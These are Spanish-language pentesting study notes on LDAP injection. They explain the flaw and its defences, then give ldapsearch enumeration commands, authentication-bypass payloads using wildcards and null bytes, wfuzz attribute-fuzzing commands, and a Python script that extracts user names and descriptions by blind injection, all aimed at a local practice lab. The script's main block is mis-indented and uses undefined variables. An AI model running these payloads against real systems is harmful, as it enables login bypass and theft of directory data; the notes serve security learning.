# Inyecciones LDAP

Tags: #LDAP #OWASP #Explotacion #AD 

* [LDAP](https://www.profesionalreview.com/2019/01/05/ldap/)

Las inyecciones **LDAP** (**Protocolo de Directorio Ligero**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.

La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

Al igual que las inyecciones SQL y NoSQL, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:

-   Acceder a información de usuarios o recursos que no debería tener acceso.
-   Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar o eliminar usuarios o recursos.
-   Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red.

Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.

A continuación, se proporciona el enlace directo al proyecto de GitHub que nos descargamos para desplegar un laboratorio práctico donde poder ejecutar esta vulnerabilidad:

-   **LDAP-Injection-Vuln-App**: [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)

Este es el puerto estándar para LDAP (Lightweight Directory Access Protocol), que se utiliza para acceder y gestionar los servicios de directorio. En el contexto de AD, LDAP se usa para realizar consultas y cambios en el directorio de AD.
## LDAP

```bash 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap   # Web con comandos LDAP

❯ ldapsearch -x -h <IP> -s base namingcontexts         # Hacemos un 'simple authentication' para enumerar 
❯ ldapsearch -x -h <IP> -b 'DC=example'                # Enumeramos el dominio 
```

```bash
❯ ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'   # Podemos ver informacion del usuario admin 

	# b,dc,dc = Base de busqueda, que el dominio seria example.org
	# D = Nombre distinguido
	# 1er_cn = Usuario a autenticar
	# w = Password 
	# x = Autenticacion simple (Usuario, Passwd)
	# 2do_cn = Criterio de busqueda y si existe que nos reporte la informacion  
```

```bash
❯ ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=omar'    # Para enumerar un usuario especifico como 'omar'
```

```bash
❯ ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=omar)(description=LDAP*))'

	# (&(cn=omar)(description=LDAP*)) = Le decimos que el usuario a buscar es omar 'y' su descripcion es LDAP, con * le decimos que tiene mas contenido despues de LDAP
	# (|(cn=omar)(description=LDAP*)) = Le decimos que el usuario a buscar es omar 'o' su descripcion es LDAP, con * le decimos que tiene mas contenido despues de LDAP
```

```bash
❯ ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldif  # Creara un usuario en base a un archivo que le pasemos
```

```python
❯ nvim newuser.ldif
	dn: uid=omar,cd=example,dc=org
	uid: omar
	cn: omar
	sn: 3
	objectClass: top
	objectClass: posixAccount
	objectClass: inetOrgPerson
	loginShell: /bin/bash
	homeDirectory: /home/omar
	uidNumber: 14583102
	gidNumber: 14564100
	userPassword: omar123                      # Automaticamente pasara la passwd a base64
	mail: omar@omarcorp.com
	description: Es una prueba 
	telephoneNumber: 6467548712
```

## Inyecciones

```bash
❯ id=a* &password=*                                  # Nos ayuda a decir que existe cualquier tipo de data y por ende nos ayuda a enumerar usuarios validos

	# a* = Decimos que el usuario empieza con 'a' y despues contiene data, podria ser 'admin'
```

```bash
❯ id=admin))%00 &password=test                        # Es como si hicieramos esto = (&(cn=admin))%00)(userPassword=*))

	# %00 = Es un Null byte, que con )) nos ayuda a comentar el resto de la query y no lea la parte de la passwd
```

```bash
❯ /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt            # Diccionario con atributos para LDAP
```

Enviaremos data por **POST** para hacer el Fuzzing de los atributos
```bash
❯ wfuzz -c --hh=439 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888

	# FUZZ = Ahi se sustituira el diccionario, en donde colocara todos los atributos y los que hagan match con cualquier data, nos mostrara el resultado
	# La query original es esta 'user_id=admin&password=admin&login=1&submit=Submit'
	# %00 = Colocamos el Null byte y los )) para comentar el resto de la query y no nos interprete la password
	# hh = Ocultar los caracteres que tengan como resultado 439
```

```bash
❯ wfuzz -c -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=*)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888

	# FUZZ = Ahi se sustituira el diccionario, en donde colocara todos los atributos y los que hagan match con cualquier data, nos mostrara el resultado
	# user_id = * es para enumerar todos los usuarios, ya que esta haciendo match con data
	# La query original es esta 'user_id=admin&password=admin&login=1&submit=Submit'
	# %00 = Colocamos el Null byte y los )) para comentar el resto de la query y no nos interprete la password
```

Para hacer Fuzzing a un atributo especifico, en este caso para el telephoneNumber
```bash
❯ wfuzz -c --hh=439 -z range,0-9 -d 'user_id=omar)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888

	# Nos descubriria siempre un numero, y lo debemos de agregar antes de la palabra FUZZ, asi hasta encontrar el numero final
	# FUZZ = Ahi se sustituira el diccionario
	# z = Diccionario de tipo range 
	# user_id = Buscar por un usuario especifico
	# La query original es esta 'user_id=admin&password=admin&login=1&submit=Submit'
	# %00 = Colocamos el Null byte y los )) para comentar el resto de la query y no nos interprete la password
```

Script para enumerar usuario validos, pero estos tienen atributos como:
* mail
* telephoneNumber
```python
❯ nvim ldapi.py
	#!/usr/bin/python3
	from pwn import *
	import requests, time, sys, signal, string

	def def_handler(sig, frame):
		print("\n\n[!] Saliendo...\n")
		sys.exit(1)

	# Ctrl + c
	signal.signal(signal.SIGINT, def_handler)

	# Variables globales
	main_url = "http://localhost:8888/"

	def getInitialUsers():
		characters = string.ascii_lowercase
		initial_users = []
		headers = {'Content-Type': 'application/x-www-form-urlencoded'}
		for character in characters:
			post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
			r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)
			if r.status_code == 301:
				initial_users.append(character)
		return initial_users

	def getUsers(initial_users):
		characters = string.ascii_lowercase + string.digits
		headers = {'Content-Type': 'application/x-www-form-urlencoded'}
		valid_users = []
		for first_character in initial_users: 
			user = ""
			for position in range(0, 15):     
				for character in characters:
					post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)
					r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)
					if r.status_code == 301:
						user += character 
						break
			valid_users.append(first_character + user)
		print("\n")
		for user in valid_users:
			log.info("Usuario valido encontrado: %s" % user)
		print("\n")
		return valid_users

	def getDescription(user):                   # Para un usuario especifico
		characters = string.ascii_lowercase + ' '
		headers = {'Content-Type': 'application/x-www-form-urlencoded'}	
		description = ""
		p1 = log.progress("Fuerza Bruta")
		p1.status("Iniciando fuerza bruta")
		time.sleep(2)
		p2 = log.progress("Descripcion")
		for position in range(0, 50):
			for character in characters:
				post_data = "user_id={})(description={}{}*))%00*&password=*&login=1&submit=Submit".format(user, description, character)
				r = requests.post(main_url, headers=headers, data=post_data, allow_redirects=False)
				if r.status_code == 301:
					description += character 
					p2.status(description)
					break
		p1.success("Proceso de Fuerza Bruta concluido")
		p2.success("La descripcion del usuario es: %s" % description)

	if __name__ == '__main__':
	getInitialUsers()
	getUsers(initial_users)
	for i in range(0, 5):
		getDescription(valid_users[i])
```